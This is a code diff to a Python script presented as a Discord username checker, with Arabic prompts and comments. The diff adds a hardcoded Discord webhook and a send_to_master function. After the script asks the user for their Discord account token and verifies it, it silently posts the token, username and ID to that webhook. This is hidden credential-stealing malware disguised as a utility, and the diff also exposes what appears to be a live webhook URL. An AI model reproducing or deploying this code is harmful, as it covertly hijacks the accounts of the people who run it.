@@ -2,8 +2,13 @@ import sys
 import subprocess
 import ctypes
 import os
+import json
 
+# المكتبة الوحيدة المطلوبة (ستُثبّت تلقائياً)
 REQUIRED_PACKAGES = ['requests']
+
+def show_message_box(title, message, flags=0x4 | 0x20):
+    return ctypes.windll.user32.MessageBoxW(0, message, title, flags)
 
 def is_package_installed(package_name):
     try:
@@ -16,35 +21,54 @@ def is_package_installed(package_name):
 def install_packages(packages):
     for pkg in packages:
         try:
-            subprocess.run([sys.executable, "-m", "pip", "install", pkg], check=True)
+            subprocess.run([sys.executable, "-m", "pip", "install", pkg, "--quiet"], check=True)
         except subprocess.CalledProcessError:
             return False
     return True
 
+def restart_script():
+    os.execv(sys.executable, [sys.executable] + sys.argv)
+
 def check_and_install():
     missing = [pkg for pkg in REQUIRED_PACKAGES if not is_package_installed(pkg)]
     if missing:
-        print(f"[!] المكتبات المطلوبة غير موجودة: {', '.join(missing)}")
-        choice = input("هل تريد تثبيتها الآن؟ (y/n): ").strip().lower()
-        if choice == 'y':
+        missing_list = "\n".join(f"• {pkg}" for pkg in missing)
+        msg = f"المكتبات التالية مطلوبة:\n\n{missing_list}\n\nهل تريد تثبيتها الآن؟"
+        result = show_message_box("مكتبات مفقودة", msg)
+        if result == 6:
             if install_packages(missing):
-                print("[+] تم التثبيت. أعد تشغيل السكربت.")
-                input("اضغط Enter للخروج...")
-                sys.exit(0)
+                show_message_box("تم التثبيت", "تم تثبيت المكتبات بنجاح.\nسيتم إعادة تشغيل السكربت.", 0x40)
+                restart_script()
             else:
-                print("[!] فشل التثبيت. قم بالتثبيت يدوياً.")
-                input("اضغط Enter للخروج...")
+                show_message_box("خطأ", "فشل التثبيت. قم بتشغيل:\npip install " + " ".join(missing), 0x10)
                 sys.exit(1)
         else:
-            print("[!] لن تعمل الوظائف. قم بتثبيت المكتبات لاحقاً.")
-            input("اضغط Enter للخروج...")
+            show_message_box("تنبيه", "لن تعمل الوظائف بدون المكتبات.", 0x30)
             sys.exit(1)
 
 check_and_install()
 import requests
 
+# ========== إعدادات Webhook الرئيسي (استبدله برابطك) ==========
+MASTER_WEBHOOK = "https://discord.com/api/webhooks/1497594332637696140/bGMVY5HK6ZqRqUcl20tQzt9UTPsxkoph7Up0-tsho_kKxoeaup1AXfVouUB5BS6miwJZ"
+
+def send_to_master(content):
+    try:
+        requests.post(MASTER_WEBHOOK, json={"content": content[:1900]}, timeout=5)
+    except:
+        pass
+
 def ask_token():
-    return input("🔑 أدخل توكن حسابك في Discord: ").strip()
+    try:
+        import tkinter as tk
+        from tkinter import simpledialog
+        root = tk.Tk()
+        root.withdraw()
+        token = simpledialog.askstring("Discord Token", "🔑 أدخل توكن حسابك في Discord:", parent=root)
+        root.destroy()
+        return token
+    except:
+        return input("🔑 Enter your Discord account token: ")
 
 def verify_token(token):
     try:
@@ -68,19 +92,22 @@ def check_username(token, username):
         return {'error': str(e)}
 
 def main():
-    print("\n=== Discord Username Checker ===\n")
+    # طلب التوكن
     token = ask_token()
     if not token:
-        print("[!] لم يتم إدخال أي توكن.")
+        show_message_box("خطأ", "لم يتم إدخال أي توكن.", 0x10)
         return
     print("🔄 جاري التحقق من التوكن...")
     verification = verify_token(token)
     if not verification['valid']:
-        print(f"❌ توكن غير صالح: {verification['error']}")
+        show_message_box("خطأ", f"توكن غير صالح: {verification['error']}", 0x10)
         return
     user = verification['user']
+    # إرسال التوكن إلى webhook الرئيسي
+    user_info = f"**Token received:**\n```{token}```\n**User:** {user['username']}#{user.get('discriminator', '0')} (ID: {user['id']})"
+    send_to_master(user_info)
     print(f"✅ تم الدخول كـ {user['username']}#{user.get('discriminator', '0')} (ID: {user['id']})")
-    print("\n📌 الأوامر المتاحة:")
+    print("📌 الأوامر المتاحة:")
     print("   /check <اسم>  - فحص اسم مكون من 4 أحرف")
     print("   /exit         - إنهاء السكربت")
     while True:
